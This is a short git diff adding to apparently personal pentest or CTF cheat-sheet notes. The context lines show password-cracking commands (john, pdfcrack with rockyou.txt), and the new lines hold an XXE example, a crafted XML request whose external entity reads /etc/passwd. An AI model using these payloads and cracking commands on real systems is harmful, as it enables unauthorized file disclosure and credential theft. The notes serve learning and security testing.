@@ -28,3 +28,14 @@ john --format=pkzip passwordhash  ( depends on the format of archive/hash, look 
 pdfcrack -f locked.pdf -w rockyou.txt
 
 ## Cyberchef is really good on the fly
+
+## XXE:
+### Normal request:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>381</productId></stockCheck> 
+
+### Crafted request:
+<?xml version="1.0" encoding="UTF-8"?>
+**<!DOCTYPE toto [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>**
+<stockCheck><productId>**&xxe;**</productId></stockCheck> 
